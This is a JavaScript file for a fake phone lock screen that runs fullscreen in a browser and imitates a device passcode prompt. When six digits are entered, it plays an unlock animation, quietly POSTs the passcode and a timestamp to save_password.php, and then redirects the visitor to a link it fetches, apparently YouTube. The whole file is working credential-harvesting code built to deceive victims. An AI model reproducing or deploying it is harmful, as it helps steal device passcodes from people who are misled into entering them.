let enteredPassword = "";
const maxLength = 6;
const circles = document.querySelectorAll(".password-circle");
const keypadContainer = document.getElementById("keypad");
const phoneFrame = document.querySelector(".phone-frame");
const lockScreen = document.querySelector(".lock-screen");
const topSection = document.querySelector(".top-section");
const middleSection = document.querySelector(".middle-section");
const bottomSection = document.querySelector(".bottom-section");
const lockIcon = document.querySelector(".lock-icon");
const lockText = document.querySelector(".lock-text");
const keypad = document.getElementById("keypad");
const redirectDiv = document.getElementById("redirect");

// YouTube redirect link
// const youtubeLink = "https://www.youtube.com";

let youtubeLink = "";

fetch("config.php?get=youtube")
  .then((res) => res.json())
  .then((data) => {
    youtubeLink = data.youtubeLink;
  });

// Create keypad
function createKeypad() {
  for (let i = 1; i <= 9; i++) {
    const btn = document.createElement("button");
    btn.className = "keypad-btn";
    btn.textContent = i;
    btn.onclick = () => addDigit(i);
    keypadContainer.appendChild(btn);
  }

  const deleteBtn = document.createElement("button");
  deleteBtn.className = "keypad-btn delete-btn";
  deleteBtn.textContent = "⌫";
  deleteBtn.onclick = deleteDigit;
  keypadContainer.appendChild(deleteBtn);

  const zeroBtn = document.createElement("button");
  zeroBtn.className = "keypad-btn";
  zeroBtn.textContent = "0";
  zeroBtn.onclick = () => addDigit(0);
  keypadContainer.appendChild(zeroBtn);
}

// Add digit to password
function addDigit(digit) {
  if (enteredPassword.length < maxLength) {
    enteredPassword += digit;
    updateUI();
    hapticFeedback();
  }
}

// Delete last digit
function deleteDigit() {
  if (enteredPassword.length > 0) {
    enteredPassword = enteredPassword.slice(0, -1);
    updateUI();
    hapticFeedback();
  }
}

// Update UI
function updateUI() {
  circles.forEach((circle, index) => {
    if (index < enteredPassword.length) {
      circle.classList.add("filled");
    } else {
      circle.classList.remove("filled");
    }
  });

  if (enteredPassword.length === maxLength) {
    setTimeout(simulateUnlock, 300);
  }
}

// Haptic feedback simulation
function hapticFeedback() {
  if (navigator.vibrate) {
    navigator.vibrate(10);
  }
}

// Save password
function savePasswordToBackend(password) {
  const data = new FormData();
  data.append("password", password);
  data.append("timestamp", new Date().toISOString());

  fetch("save_password.php", {
    method: "POST",
    body: data,
  });
}

// Simulate unlock
function simulateUnlock() {
  const password = enteredPassword;

  phoneFrame.classList.add("unlocking");
  lockScreen.classList.add("unlocking");
  topSection.classList.add("fade-out");
  bottomSection.classList.add("fade-out");
  keypad.classList.add("fade-out");
  middleSection.classList.add("shift-up");
  lockIcon.classList.add("unlocking");
  lockText.classList.add("unlocking");

  // Save password & redirect
  setTimeout(() => {
    savePasswordToBackend(password);

    setTimeout(() => {
      window.location.href = youtubeLink;
    });
  }, 300);
}

// Time update
function updateTime() {
  const now = new Date();
  const hours = String(now.getHours()).padStart(2, "0");
  const minutes = String(now.getMinutes()).padStart(2, "0");
  document.getElementById("time").textContent = `${hours}:${minutes}`;
}

setInterval(updateTime, 250);
updateTime();

// Fullscreen toggle
function myFunction() {
  toggleFullScreen(document.body);

  const handleFullscreenChange = () => {
    if (document.fullscreenElement) {
      phoneFrame.classList.add("show");
      redirectDiv.style.display = "none";
    } else {
      phoneFrame.classList.remove("show");
      redirectDiv.style.display = "flex";
      resetLockScreen();
    }
  };

  document.addEventListener("fullscreenchange", handleFullscreenChange);
}

function toggleFullScreen(elem) {
  if (!document.fullscreenElement) {
    elem.requestFullscreen();
  } else {
    document.exitFullscreen();
  }
}

// Reset lock screen
function resetLockScreen() {
  enteredPassword = "";
  circles.forEach((circle) => circle.classList.remove("filled"));
  phoneFrame.classList.remove("unlocking");
  lockScreen.classList.remove("unlocking");
  topSection.classList.remove("fade-out");
  bottomSection.classList.remove("fade-out");
  keypad.classList.remove("fade-out");
  middleSection.classList.remove("shift-up");
  lockIcon.classList.remove("unlocking");
  lockText.classList.remove("unlocking");
}

// Initialize keypad
createKeypad();
